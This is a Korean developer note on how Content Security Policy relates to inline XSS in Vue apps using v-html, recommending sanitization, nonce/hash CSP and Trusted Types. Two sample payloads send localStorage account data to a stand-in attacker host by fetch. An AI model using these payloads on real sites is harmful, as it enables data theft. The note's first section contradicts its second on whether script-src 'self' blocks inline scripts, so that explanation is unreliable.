---
id: fof5x2htn0tr6euz2trv2mu
title: CSP와 inline으로 삽입된 XSS 스크립트의 관계
desc: ""
updated: 1760334816501
created: 1760334801389
---

## CSP와 inline으로 삽입된 XSS 스크립트의 관계

### 핵심 질문: "inline으로 XSS script를 넣으면 CSP은 무용지물 아닌가?"

답변: **맞습니다, 부분적으로 무용지물이 될 수 있습니다.**

## 1. 인라인 스크립트와 CSP의 한계

### CSP가 막을 수 없는 경우

```html
<!-- v-html로 직접 삽입된 악성 스크립트 -->
<div v-html="userContent">
  <script>
    // 이 스크립트는 이미 DOM에 삽입되어 실행됨
    fetch("https://attacker.com/steal", {
      method: "POST",
      body: localStorage.getItem("accountInfo"),
    })
  </script>
</div>
```

CSP가 `script-src 'self'`로 설정되어 있어도, **이미 DOM에 삽입된 인라인 스크립트**는 차단되지 않습니다.

## 2. CSP가 효과적인 경우

하지만 CSP는 여전히 중요한 방어층입니다:

### CSP 설정 예시

```javascript
Content-Security-Policy:
  default-src 'self';
  script-src 'self';  // 인라인 스크립트 차단
  connect-src 'self'; // 외부 서버 연결 차단
```

### CSP가 차단하는 것들

- ❌ `<script src="https://evil.com/malicious.js">` - 외부 스크립트 로드
- ❌ `eval()`, `Function()` 같은 동적 코드 실행
- ❌ `fetch('https://attacker.com')` - 외부 서버로 데이터 전송
- ❌ 이벤트 핸들러 속성 (`onclick`, `onerror` 등)

## 3. 실제 공격 시나리오에서 CSP의 역할

```html
<!-- 공격자가 삽입한 XSS -->
<img
  src="x"
  onerror="fetch('//attacker.com?c='+localStorage.getItem('accountInfo'))"
/>
```

### CSP가 있을 때 차단되는 것들

- `img-src 'self'` → 외부 이미지 로드 차단
- `connect-src 'self'` → attacker.com으로 fetch 차단
- `script-src 'self'` → onerror 인라인 이벤트 핸들러 차단

## 4. 올바른 방어 전략: Defense in Depth

단일 방어 메커니즘에 의존하지 않고 **다층 방어**가 필요합니다:

### 1단계: 입력 검증 (서버 측)

```javascript
// 주의: 기본적인 예시 - 실제로는 불완전함
function validateInput(content) {
  // HTML 태그 제거 또는 이스케이프
  return content.replace(/<script[^>]*>.*?<\/script>/gi, "")
  // ⚠️ 이 방법은 <ScRiPt>, <script/src=...> 같은 변형을 막지 못함
}

// OWASP 권장: 전문 라이브러리 사용
import validator from "validator"
import xss from "xss"

function secureValidateInput(content) {
  // HTML 인코딩
  const encoded = validator.escape(content)
  // 또는 XSS 필터링 라이브러리 사용
  return xss(content)
}
```

**추가 권장사항:**

- WAF (Web Application Firewall) 도입 고려
- OWASP AntiSamy, ESAPI 등 검증된 라이브러리 사용

### 2단계: 출력 시 Sanitization

```javascript
import DOMPurify from "dompurify"

export default {
  computed: {
    safeContent() {
      return DOMPurify.sanitize(this.userContent, {
        ALLOWED_TAGS: ["b", "i", "u", "p", "br"],
        ALLOWED_ATTR: [],
      })
    },
  },
}
```

### 3단계: 엄격한 CSP 설정

```javascript
// Nonce 기반 CSP (동적 콘텐츠에 적합)
Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'nonce-random123';  // 각 요청마다 새로운 nonce 생성
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  connect-src 'self';
  frame-ancestors 'none';

// Hash 기반 CSP (정적 콘텐츠에 적합)
Content-Security-Policy:
  script-src 'self' 'sha256-B2yPHKaXnvFWtRChIbabYmUBFZdVfKKXHbWtWidDVF8=';
  // 특정 인라인 스크립트의 SHA-256 해시만 허용
```

**Nonce vs Hash:**

- **Nonce**: 매 요청마다 서버가 생성하는 랜덤 값. Stored XSS 시 공격자가 nonce를 예측할 수 없어 효과적
- **Hash**: 정적 인라인 스크립트의 해시값. 변경되지 않는 코드에 적합

### 3-1단계: CSP Report-Only 모드로 테스트

```javascript
// 프로덕션 배포 전 테스트
Content-Security-Policy-Report-Only:
  default-src 'self';
  script-src 'self';
  report-uri /csp-violation-report;
  // CSP 위반 시 차단하지 않고 보고만 함
```

## 5. v-html의 위험성과 대안

### 위험한 코드

```vue
<div v-html="notice.content"></div>
```

### 안전한 대안

```vue
<!-- 1. 텍스트로만 렌더링 -->
<div v-text="notice.content"></div>

<!-- 2. DOMPurify로 정화된 HTML -->
<div v-html="sanitizedContent"></div>

<!-- 3. Markdown 파서 사용 (사용자 콘텐츠를 안전하게) -->
<template>
  <div v-html="parsedMarkdown"></div>
</template>

<script>
import marked from "marked"
import DOMPurify from "dompurify"

export default {
  computed: {
    parsedMarkdown() {
      // Markdown을 HTML로 변환 후 정화
      const rawHtml = marked.parse(this.userContent)
      return DOMPurify.sanitize(rawHtml)
    },
  },
}
</script>

<!-- 4. 코드 하이라이팅이 필요한 경우 -->
<script>
import hljs from "highlight.js"
import DOMPurify from "dompurify"

// DOMPurify 훅 추가로 코드 블록 안전하게 처리
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName === "CODE") {
    hljs.highlightElement(node)
  }
})
</script>
```

## 6. 최신 보안 트렌드: CSP Level 3 Trusted Types

### Trusted Types를 사용한 XSS 완화

```javascript
// CSP에 Trusted Types 정책 추가
Content-Security-Policy:
  require-trusted-types-for 'script';
  trusted-types myPolicy;

// JavaScript에서 Trusted Types 정책 생성
if (window.trustedTypes && trustedTypes.createPolicy) {
  const myPolicy = trustedTypes.createPolicy('myPolicy', {
    createHTML: (input) => {
      // DOMPurify로 정화 후 TrustedHTML 반환
      return DOMPurify.sanitize(input);
    },
    createScript: (input) => {
      // 스크립트는 완전히 차단
      throw new Error('Scripts not allowed');
    }
  });
}

// Vue.js와 결합
export default {
  mounted() {
    // Trusted Types가 적용되면 innerHTML 직접 할당이 차단됨
    // this.$el.innerHTML = userContent; // ❌ 차단됨

    // 정책을 통해서만 가능
    if (window.myPolicy) {
      this.$el.innerHTML = myPolicy.createHTML(userContent);
    }
  }
}
```

**장점:**

- DOM XSS sink(innerHTML, outerHTML 등)를 근본적으로 차단
- Vue.js의 v-html도 Trusted Types 정책 적용 가능
- 브라우저 레벨에서 XSS 방지

## 결론

### CSP만으로는 불충분하지만, 여전히 중요합니다

1. **CSP의 한계**:

   - Stored XSS로 이미 삽입된 인라인 스크립트는 막기 어려움
   - 특히 `unsafe-inline`을 허용하면 거의 무용지물

2. **그래도 CSP가 필요한 이유**:

   - 외부 리소스 로드 차단
   - 데이터 유출 경로 차단
   - 공격의 영향 범위 제한

3. **올바른 접근 방법**:
   - **입력 검증** (서버 측) - OWASP 권장 라이브러리 사용
   - **출력 인코딩/Sanitization** (클라이언트 측)
   - **엄격한 CSP** (추가 방어층) - Nonce/Hash 활용
   - **v-html 사용 최소화** - Markdown 파서 등 대안 활용
   - **Trusted Types** (최신 브라우저) - DOM XSS 근본 차단

## 보안 체크리스트

### 필수 구현 사항

- [ ] CSP (Content Security Policy) 설정
  - [ ] Nonce 또는 Hash 기반 정책 적용
  - [ ] Report-Only 모드로 테스트 후 적용
- [x] `v-html` 사용 위치 전수 검사
- [ ] 서버 측 입력 검증
  - [ ] OWASP 권장 라이브러리 (validator.js, xss 등) 사용
  - [ ] WAF 도입 검토
- [ ] 클라이언트 측 Sanitization
  - [ ] DOMPurify 라이브러리 적용
  - [ ] Markdown 파서 사용 시 정화 적용
- [ ] CSP Level 3 Trusted Types 도입 (모던 브라우저)
- [x] HttpOnly 쿠키 사용 고려 (CSRF 복잡도 vs localStorage)

### 권장 구현 순서

1. **즉시**: v-html 제거 또는 DOMPurify 적용
2. **단기**: 서버 측 입력 검증 강화
3. **중기**: CSP Report-Only 모드 테스트
4. **장기**: Trusted Types 도입

> **핵심**: v-html을 제거하거나 Sanitization을 적용하는 것이 CSP보다 더 근본적인 해결책입니다. CSP는 추가적인 방어층으로 활용해야 합니다. **Defense in Depth** 전략으로 다층 방어를 구축하세요.
